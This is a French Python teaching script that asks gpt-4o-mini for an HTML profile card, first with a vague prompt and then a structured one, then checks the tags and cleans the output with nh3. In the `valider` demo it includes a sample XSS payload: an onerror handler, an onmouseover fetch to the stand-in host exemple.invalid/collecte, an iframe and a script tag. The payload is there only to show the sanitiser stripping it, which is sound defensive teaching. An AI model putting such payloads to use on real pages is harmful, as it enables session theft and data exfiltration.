"""Volet 1 - du prompt vague au HTML assaini.

Support de formation. Trois démonstrations, une sous-commande chacune :

    uv run generer.py libre       trois fois le même prompt vague, température par défaut
    uv run generer.py structure   un appel du prompt structuré, température 0
    uv run generer.py valider     génération structurée, vérification, assainissement

Le code produit est écrit dans sortie/. Le script n'expose aucun serveur et
ne sert aucun fichier à un navigateur.
"""

import os
import re
import sys
from html.parser import HTMLParser
from pathlib import Path

DOSSIER = Path(__file__).resolve().parent
DOSSIER_SORTIE = DOSSIER / "sortie"
RACINE_DEPOT = DOSSIER.parents[2]
# La clé est cherchée dans l'environnement, puis dans le .env de la racine.
FICHIER_ENV = RACINE_DEPOT / ".env"
NOM_CLE = "OPENAI_API_KEY"

BASE_URL = "https://api.openai.com/v1"
MODELE = "gpt-4o-mini"

# Les contraintes de format vivent ici, jamais dans le prompt utilisateur.
PROMPT_SYSTEME = (
    "Tu produis uniquement du code HTML et CSS. Tout le CSS tient dans une "
    "seule balise <style>. Aucun texte d'explication, aucun commentaire, "
    "aucun bloc de code markdown."
)

PROMPT_VAGUE = "Crée une carte de profil utilisateur"

PROMPT_STRUCTURE = """Génère uniquement le code HTML et CSS (dans une seule balise <style>)
d'une carte de profil utilisateur avec :
- une photo circulaire (placeholder 80x80px)
- un nom et un poste sur deux lignes
- trois boutons alignés horizontalement : Suivre, Message, Bloquer
- une bordure arrondie et une ombre légère
Ne génère aucun texte d'explication, uniquement le code."""

# Les vecteurs réels d'une injection dans une page : les attributs d'événement
# et l'iframe. La balise <script>, elle, ne serait pas exécutée.
CHARGE_INJECTION = (
    '<div class="carte">'
    '<img src="avatar.png" alt="avatar" onerror="alert(\'vol de session\')">'
    '<p onmouseover="fetch(\'https://exemple.invalid/collecte\')">Camille Dupont</p>'
    '<iframe src="https://exemple.invalid/piege"></iframe>'
    '<script>alert(\'charge inerte\')</script>'
    "</div>"
)

# Balises autofermantes : jamais empilées par le vérificateur, sinon il
# signalerait des balises non fermées qui n'existent pas.
BALISES_AUTOFERMANTES = {
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
}

BALISES_AUTORISEES = {
    "html", "head", "body", "title", "meta", "style",
    "div", "section", "article", "header", "footer", "main", "span", "p",
    "h1", "h2", "h3", "h4", "ul", "li", "a", "img", "button",
    "strong", "em", "br", "hr", "small",
}

ATTRIBUTS_AUTORISES = {
    "*": {"class", "id", "style"},
    "img": {"src", "alt", "width", "height"},
    "a": {"href", "title"},
    "meta": {"charset", "name", "content"},
    "button": {"type"},
}


def lire_cle():
    """Lit la clé OpenAI dans l'environnement, puis dans le .env de la racine.

    S'arrête avec un message explicite avant tout appel réseau si elle manque.
    La clé n'est jamais affichée ni recopiée où que ce soit.
    """
    cle = os.environ.get(NOM_CLE)
    if cle:
        return cle
    if FICHIER_ENV.is_file():
        for ligne in FICHIER_ENV.read_text(encoding="utf-8").splitlines():
            ligne = ligne.strip()
            if not ligne or ligne.startswith("#") or "=" not in ligne:
                continue
            nom, valeur = ligne.split("=", 1)
            if nom.strip() == NOM_CLE:
                valeur = valeur.strip().strip('"').strip("'")
                if valeur:
                    return valeur
    sys.exit(
        f"Clé {NOM_CLE} introuvable : absente de l'environnement et du "
        f"fichier {FICHIER_ENV}\n"
        "Aucun appel réseau n'a été tenté."
    )


def appeler_modele(prompt, temperature=None):
    """Appelle le modèle et retourne le contenu produit et le nombre de tokens."""
    from openai import OpenAI

    client = OpenAI(base_url=BASE_URL, api_key=lire_cle())
    parametres = {
        "model": MODELE,
        "messages": [
            {"role": "system", "content": PROMPT_SYSTEME},
            {"role": "user", "content": prompt},
        ],
    }
    if temperature is not None:
        parametres["temperature"] = temperature
    reponse = client.chat.completions.create(**parametres)
    return reponse.choices[0].message.content, reponse.usage.total_tokens


def controler(code):
    """Vérifie mécaniquement chaque exigence portée par le prompt structuré.

    Un critère par exigence, une réponse booléenne : rien n'est affirmé, tout
    est mesuré. Ces expressions régulières sont des contrôles de forme.
    """
    depouille = code.strip()
    return {
        "une seule balise <style>": len(re.findall(r"<style\b", code, re.I)) == 1,
        "une image": len(re.findall(r"<img\b", code, re.I)) >= 1,
        "exactement trois boutons": len(re.findall(r"<button\b", code, re.I)) == 3,
        "des coins arrondis": re.search(r"border-radius", code, re.I) is not None,
        "une ombre": re.search(r"box-shadow", code, re.I) is not None,
        "aucun texte avant la première balise": depouille.startswith("<"),
    }


def retirer_cloture_markdown(code):
    """Retire une éventuelle clôture markdown autour du code.

    Nettoyage de forme uniquement : le modèle ajoute parfois ces trois
    apostrophes inverses malgré la consigne. Aucun rôle de sécurité.
    """
    depouille = code.strip()
    depouille = re.sub(r"\A```[a-zA-Z]*[ \t]*\r?\n?", "", depouille)
    depouille = re.sub(r"\r?\n?```\Z", "", depouille)
    return depouille.strip()


class VerificateurBalises(HTMLParser):
    """Empile les balises ouvrantes et confronte chaque fermeture à la pile."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.pile = []
        self.non_fermees = []
        self.fermees_sans_ouverture = []

    def handle_starttag(self, balise, attributs):
        if balise not in BALISES_AUTOFERMANTES:
            self.pile.append(balise)

    def handle_startendtag(self, balise, attributs):
        pass  # <balise /> se ferme elle-même : rien à empiler.

    def handle_endtag(self, balise):
        if balise in BALISES_AUTOFERMANTES:
            return
        if balise not in self.pile:
            self.fermees_sans_ouverture.append(balise)
            return
        while self.pile:
            ouverte = self.pile.pop()
            if ouverte == balise:
                break
            self.non_fermees.append(ouverte)


def verifier_balises(code):
    """Retourne les balises jamais fermées et celles fermées sans avoir été ouvertes."""
    verificateur = VerificateurBalises()
    verificateur.feed(code)
    verificateur.close()
    jamais_fermees = verificateur.non_fermees + list(reversed(verificateur.pile))
    return jamais_fermees, verificateur.fermees_sans_ouverture


def assainir(code):
    """Assainit le code avec nh3, jamais avec une expression régulière.

    Seul <script> voit son contenu supprimé : la configuration par défaut de
    l'assainisseur viderait aussi <style>, ce qui effacerait tout le CSS.
    """
    import nh3

    return nh3.clean(
        code,
        tags=BALISES_AUTORISEES,
        attributes=ATTRIBUTS_AUTORISES,
        clean_content_tags={"script"},
        strip_comments=True,
    )


def libre():
    """Trois fois le même prompt vague, à la température par défaut."""
    DOSSIER_SORTIE.mkdir(exist_ok=True)
    print("Démonstration 1 : prompt vague, température par défaut, trois appels.\n")
    for numero in (1, 2, 3):
        code, tokens = appeler_modele(PROMPT_VAGUE)
        chemin = DOSSIER_SORTIE / f"etape1-appel{numero}.html"
        chemin.write_text(code, encoding="utf-8")
        manques = [nom for nom, tenu in controler(code).items() if not tenu]
        print(f"Appel {numero}")
        print(f"  tokens            : {tokens}")
        print(f"  taille            : {len(code)} caractères")
        print(f"  critères non tenus: {', '.join(manques) if manques else 'aucun'}")
        print(f"  écrit dans        : {chemin.relative_to(DOSSIER)}\n")


def structure():
    """Un seul appel, prompt structuré, température 0."""
    DOSSIER_SORTIE.mkdir(exist_ok=True)
    print("Démonstration 2 : prompt structuré, température 0, un appel.\n")
    code, tokens = appeler_modele(PROMPT_STRUCTURE, temperature=0)
    chemin = DOSSIER_SORTIE / "etape2-structure.html"
    chemin.write_text(code, encoding="utf-8")
    print(f"tokens : {tokens}")
    print(f"taille : {len(code)} caractères\n")
    for nom, tenu in controler(code).items():
        print(f"  {'oui' if tenu else 'NON'}  {nom}")
    print(f"\nécrit dans : {chemin.relative_to(DOSSIER)}")


def valider():
    """Génération structurée, puis nettoyage, vérification et assainissement."""
    DOSSIER_SORTIE.mkdir(exist_ok=True)
    print("Démonstration 3 : rien de ce que produit un modèle ne s'affiche sans contrôle.\n")
    brut, tokens = appeler_modele(PROMPT_STRUCTURE, temperature=0)
    print(f"tokens       : {tokens}")
    print(f"taille brute : {len(brut)} caractères")

    code = retirer_cloture_markdown(brut)
    ecart = len(brut) - len(code)
    print(f"clôture markdown : {'retirée' if ecart else 'absente'}"
          f" ({len(code)} caractères après nettoyage)")

    jamais_fermees, orphelines = verifier_balises(code)
    print("\nVérification des balises")
    print(f"  jamais fermées         : {', '.join(jamais_fermees) if jamais_fermees else 'aucune'}")
    print(f"  fermées sans ouverture : {', '.join(orphelines) if orphelines else 'aucune'}")

    assaini = assainir(code)
    chemin = DOSSIER_SORTIE / "etape3-assaini.html"
    chemin.write_text(assaini, encoding="utf-8")
    print("\nAssainissement du code généré")
    print(f"  avant : {len(code)} caractères")
    print(f"  après : {len(assaini)} caractères")
    print(f"  écrit dans : {chemin.relative_to(DOSSIER)}")

    apres = assainir(CHARGE_INJECTION)
    print("\nAssainissement d'une charge d'injection")
    print(f"  avant ({len(CHARGE_INJECTION)} caractères) :")
    print(f"    {CHARGE_INJECTION}")
    print(f"  après ({len(apres)} caractères) :")
    print(f"    {apres}")


def main():
    """Aiguille vers la démonstration demandée, ou affiche l'usage."""
    demonstrations = {"libre": libre, "structure": structure, "valider": valider}
    if len(sys.argv) != 2 or sys.argv[1] not in demonstrations:
        print(__doc__)
        return
    demonstrations[sys.argv[1]]()


if __name__ == "__main__":
    main()
